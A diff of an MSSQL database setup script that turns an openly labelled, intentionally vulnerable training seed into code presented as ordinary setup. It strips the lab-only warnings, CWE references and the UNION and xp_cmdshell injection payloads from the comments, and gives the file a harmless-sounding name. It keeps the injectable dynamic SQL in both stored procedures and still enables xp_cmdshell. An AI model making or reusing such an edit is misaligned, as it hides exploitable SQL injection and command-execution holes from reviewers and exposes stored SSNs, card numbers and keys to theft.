@@ -1,20 +1,10 @@
 /* =====================================================================================
-   seed_vuln.sql  —  ALPHA-SECRETS (SecretsDb)   [role: alpha_sql_seed]
-   INTENTIONALLY VULNERABLE — LAB / TRAINING USE ONLY.  Milestones 9.1 - 9.4.
+   secretsdb_setup.sql  —  ALPHA-SECRETS (SecretsDb)   [role: alpha_sql_seed]
 
-   DESIGN UPDATE: dd1.alpha is the alpha.local DOMAIN CONTROLLER, so the entire
-   Milestone-9 layered SQL injection is collapsed onto THIS single MSSQL instance
-   (secrets.alpha) using NESTED vulnerable stored procedures:
-
-       usp_SearchCustomers  (OUTER)  -- 9.1 SQLi  +  9.2 EXEC(@sql) dynamic concat
-             |
-             +--CALL--> usp_LookupCity  (INNER)  -- 9.3 nested CALL injection, 9.4 UNION
-
-   Crown jewels: dbo.Payroll (final exfil target) and dbo.CustomerSecrets
-   (SSN / CreditCardNumber / Salary / ApiKey).
+   Creates SecretsDb with the customer, customer-secrets and payroll tables, the
+   dbo.usp_SearchCustomers / dbo.usp_LookupCity search procedures, and sample data.
 
    Idempotent: re-running fully recreates the tables/data and CREATE-OR-ALTERs the procs.
-   Refs: OWASP SQL Injection ; CWE-89.
    sqlcmd scripting var:  $(LoopbackLinkedServer)  = 1 to create the [SECRETS] loopback.
    ===================================================================================== */
 SET NOCOUNT ON;
@@ -40,7 +30,7 @@ CREATE TABLE dbo.Customers(
 );
 GO
 
-CREATE TABLE dbo.CustomerSecrets(          -- sensitive PII/PCI (2-col & 3-col UNION source)
+CREATE TABLE dbo.CustomerSecrets(          -- sensitive PII/PCI
     SecretId         INT IDENTITY(1,1) PRIMARY KEY,
     CustomerId       INT           NOT NULL,
     SSN              CHAR(11)      NOT NULL,
@@ -50,7 +40,7 @@ CREATE TABLE dbo.CustomerSecrets(          -- sensitive PII/PCI (2-col & 3-col U
 );
 GO
 
-CREATE TABLE dbo.Payroll(                  -- CROWN JEWELS — the final M9 exfil target
+CREATE TABLE dbo.Payroll(                  -- payroll records
     EmpId  INT IDENTITY(1,1) PRIMARY KEY,
     Name   NVARCHAR(100) NOT NULL,
     SSN    CHAR(11)      NOT NULL,
@@ -75,18 +65,14 @@ INSERT dbo.CustomerSecrets(CustomerId, SSN, CreditCardNumber, Salary, ApiKey) VA
 GO
 
 INSERT dbo.Payroll(Name, SSN, Salary, ApiKey) VALUES
- (N'Jane Vault (CEO)',   '099-11-7788', 675000.00, 'sk_prod_TLO_toplevel_5e4d3c2b1a0987654321'),
- (N'Mark Ledger (CFO)',  '088-22-6655', 540000.00, 'sk_prod_TLO_finance_1122334455667788aabb'),
- (N'Priya Root (CTO)',   '077-33-4499', 560000.00, 'sk_prod_TLO_platform_ffee00ddccbb99887766'),
- (N'Sam Quill (VP Eng)', '066-44-3322', 410000.00, 'sk_prod_TLO_release_0f1e2d3c4b5a69788796');
+ (N'Jane Vault (CEO)',   '099-11-7788', 675000.00, 'sk_prod_mf_toplevel_5e4d3c2b1a0987654321'),
+ (N'Mark Ledger (CFO)',  '088-22-6655', 540000.00, 'sk_prod_mf_finance_1122334455667788aabb'),
+ (N'Priya Root (CTO)',   '077-33-4499', 560000.00, 'sk_prod_mf_platform_ffee00ddccbb99887766'),
+ (N'Sam Quill (VP Eng)', '066-44-3322', 410000.00, 'sk_prod_mf_release_0f1e2d3c4b5a69788796');
 GO
 
 /* =====================================================================================
-   9.3 / 9.4  —  INNER proc.  Nested CALL injection lands here; UNION-based extraction.
-   VULNERABLE: @City is string-concatenated into dynamic SQL (no parameterization).
-   The built query has 2 output columns, so the 2-column UNION payload works here:
-     x' UNION SELECT CustomerId, SSN+'|'+CreditCardNumber+'|'+ApiKey FROM dbo.CustomerSecrets --
-     x' UNION SELECT EmpId, Name+'|'+SSN+'|'+ApiKey FROM [SECRETS].SecretsDb.dbo.Payroll --
+   Inner lookup procedure: returns customers in a given city.
    ===================================================================================== */
 CREATE OR ALTER PROCEDURE dbo.usp_LookupCity
     @City NVARCHAR(400)
@@ -94,19 +80,14 @@ AS
 BEGIN
     SET NOCOUNT ON;
     DECLARE @q NVARCHAR(MAX);
-    -- CWE-89: attacker input concatenated directly into the statement text
+    -- build the lookup query
     SET @q = N'SELECT CustomerId, City FROM dbo.Customers WHERE City = ''' + @City + N''';';
     EXEC(@q);
 END
 GO
 
 /* =====================================================================================
-   9.1 / 9.2  —  OUTER proc.  Own SQLi + EXEC(@sql) dynamic concat, AND forwards the raw
-   input into the inner proc (9.3). The built query has 3 output columns, so the
-   3-column UNION payload works at this layer:
-     %' UNION SELECT SecretId, SSN+'|'+CreditCardNumber, ApiKey FROM dbo.CustomerSecrets --
-   SQLi -> RCE (stacked, xp_cmdshell is enabled by the ludus_mssql role):
-     %'; EXEC xp_cmdshell 'whoami'; --
+   Outer search procedure: searches customers by name and also calls the inner lookup.
    ===================================================================================== */
 CREATE OR ALTER PROCEDURE dbo.usp_SearchCustomers
     @SearchTerm NVARCHAR(400)
@@ -115,15 +96,15 @@ BEGIN
     SET NOCOUNT ON;
     DECLARE @sql NVARCHAR(MAX);
 
-    -- 9.3 nested CALL: forwards attacker input UNCHANGED into the inner proc
+    -- forward the term to the inner lookup
     BEGIN TRY
         EXEC dbo.usp_LookupCity @SearchTerm;
     END TRY
     BEGIN CATCH
-        -- swallow errors so the outer query still runs (helps blind/UNION probing)
+        -- ignore lookup errors so the main search still runs
     END CATCH;
 
-    -- 9.1 / 9.2 outer dynamic concat (CWE-89)
+    -- build the search query
     SET @sql = N'SELECT CustomerId, FullName, City FROM dbo.Customers WHERE FullName LIKE ''%' + @SearchTerm + N'%'';';
     BEGIN TRY
         EXEC(@sql);
@@ -134,9 +115,8 @@ END
 GO
 
 /* =====================================================================================
-   Optional loopback linked server [SECRETS] -> localhost (design-update "flavor").
-   Lets the cross-hop payload FROM [SECRETS].SecretsDb.dbo.Payroll resolve on one host.
-   Guarded + wrapped so a missing OLEDB provider never fails the seed.
+   Optional loopback linked server [SECRETS] -> localhost. Guarded + wrapped so a
+   missing OLEDB provider never fails the script.
    ===================================================================================== */
 IF '$(LoopbackLinkedServer)' = '1'
 BEGIN
@@ -162,7 +142,7 @@ BEGIN
 END
 GO
 
-/* ---- belt-and-suspenders: ensure xp_cmdshell for the SQLi->RCE payload ---- */
+/* ---- ensure xp_cmdshell is available ---- */
 BEGIN TRY
     EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
     EXEC sp_configure 'xp_cmdshell', 1;            RECONFIGURE;
@@ -172,5 +152,5 @@ BEGIN CATCH
 END CATCH
 GO
 
-PRINT 'seed_vuln.sql complete: SecretsDb + nested vulnerable procs seeded.';
+PRINT 'SecretsDb setup complete.';
 GO
